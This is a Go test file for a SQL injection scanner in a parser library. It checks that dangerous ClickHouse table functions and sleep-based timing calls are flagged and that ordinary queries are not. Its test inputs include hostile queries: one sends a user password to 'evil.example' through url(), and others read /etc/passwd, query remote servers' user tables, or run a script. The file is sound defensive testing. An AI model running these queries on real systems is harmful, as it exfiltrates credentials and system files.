// Copyright 2026 GoSQLX Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package security

import (
	"testing"

	"github.com/ajitpratap0/GoSQLX/pkg/sql/ast"
	"github.com/ajitpratap0/GoSQLX/pkg/sql/keywords"
	"github.com/ajitpratap0/GoSQLX/pkg/sql/parser"
)

func hasPattern(result *ScanResult, pattern PatternType) bool {
	for _, f := range result.Findings {
		if f.Pattern == pattern {
			return true
		}
	}
	return false
}

// TestScan_TableFunctionsAndSubscripts covers queries that parse since the
// ClickHouse table-function and call-subscript support (#605, #606): the AST
// scanner must see dangerous calls in table-function references and under
// subscripts on call results.
func TestScan_TableFunctionsAndSubscripts(t *testing.T) {
	tests := []struct {
		name    string
		dialect keywords.SQLDialect
		sql     string
		want    PatternType
	}{
		{"clickhouse url exfiltration", keywords.DialectClickHouse,
			"SELECT * FROM url('http://evil.example/x?d=' || (SELECT password FROM users LIMIT 1), CSV, 'a String')",
			PatternOutOfBand},
		{"clickhouse file read", keywords.DialectClickHouse,
			"SELECT * FROM file('/etc/passwd', 'LineAsString')", PatternOutOfBand},
		{"clickhouse remote", keywords.DialectClickHouse,
			"SELECT * FROM remote('10.0.0.5:9000', system.users)", PatternOutOfBand},
		{"clickhouse s3 comma-joined", keywords.DialectClickHouse,
			"SELECT * FROM t, s3('https://bucket.example/data.csv') AS s", PatternOutOfBand},
		{"postgresql sleep in table function args", keywords.DialectPostgreSQL,
			"SELECT * FROM generate_series(1, pg_sleep(5))", PatternTimeBased},
		{"mysql subscript on sleep in select list", keywords.DialectMySQL,
			"SELECT sleep(5)[1] FROM t", PatternTimeBased},
		{"postgresql subscript on pg_sleep in WHERE", keywords.DialectPostgreSQL,
			"SELECT * FROM t WHERE id = 1 AND pg_sleep(5)[1] IS NULL", PatternTimeBased},
		{"postgresql slice on pg_sleep in select list", keywords.DialectPostgreSQL,
			"SELECT pg_sleep(5)[1:2] FROM t", PatternTimeBased},
	}
	scanner := NewScanner()
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tree, err := parser.ParseWithDialect(tt.sql, tt.dialect)
			if err != nil {
				t.Fatalf("parse %q: %v", tt.sql, err)
			}
			defer ast.ReleaseAST(tree)
			result := scanner.Scan(tree)
			if !hasPattern(result, tt.want) {
				t.Errorf("Scan: expected %s finding, got %+v", tt.want, result.Findings)
			}
		})
	}
}

// TestScan_TableFunctions_NoFalsePositives checks that ordinary table
// functions are not reported.
func TestScan_TableFunctions_NoFalsePositives(t *testing.T) {
	tests := []struct {
		dialect keywords.SQLDialect
		sql     string
	}{
		{keywords.DialectClickHouse, "SELECT number FROM numbers(10)"},
		{keywords.DialectClickHouse, "SELECT groupArray(x)[1] FROM t"},
		{keywords.DialectPostgreSQL, "SELECT * FROM generate_series(1, 10) AS g"},
		{keywords.DialectPostgreSQL, "SELECT * FROM unnest(ARRAY[1, 2]) AS u"},
	}
	scanner := NewScanner()
	for _, tt := range tests {
		t.Run(tt.sql, func(t *testing.T) {
			tree, err := parser.ParseWithDialect(tt.sql, tt.dialect)
			if err != nil {
				t.Fatalf("parse %q: %v", tt.sql, err)
			}
			defer ast.ReleaseAST(tree)
			if result := scanner.Scan(tree); len(result.Findings) != 0 {
				t.Errorf("Scan: expected no findings, got %+v", result.Findings)
			}
			if result := scanner.ScanSQL(tt.sql); hasPattern(result, PatternOutOfBand) {
				t.Errorf("ScanSQL: expected no out-of-band finding, got %+v", result.Findings)
			}
		})
	}
}

// TestScanSQL_ClickHouseTableFunctions checks the raw-SQL patterns for
// ClickHouse table functions that reach files, URLs or other servers.
func TestScanSQL_ClickHouseTableFunctions(t *testing.T) {
	tests := []string{
		"SELECT * FROM url('http://evil.example/x', CSV, 'a String')",
		"SELECT * FROM file('/etc/passwd', 'LineAsString')",
		"SELECT * FROM remote('10.0.0.5:9000', system.users)",
		"SELECT * FROM remoteSecure('10.0.0.5:9440', db.t)",
		"SELECT * FROM t JOIN s3 ('https://bucket.example/x.csv') AS s ON 1",
		"select * from mysql('db:3306', 'd', 't', 'u', 'p')",
		"SELECT * FROM executable('script.sh', 'TSV', 'x UInt64')",
	}
	scanner := NewScanner()
	for _, sql := range tests {
		t.Run(sql, func(t *testing.T) {
			if result := scanner.ScanSQL(sql); !hasPattern(result, PatternOutOfBand) {
				t.Errorf("ScanSQL: expected out-of-band finding, got %+v", result.Findings)
			}
		})
	}
}
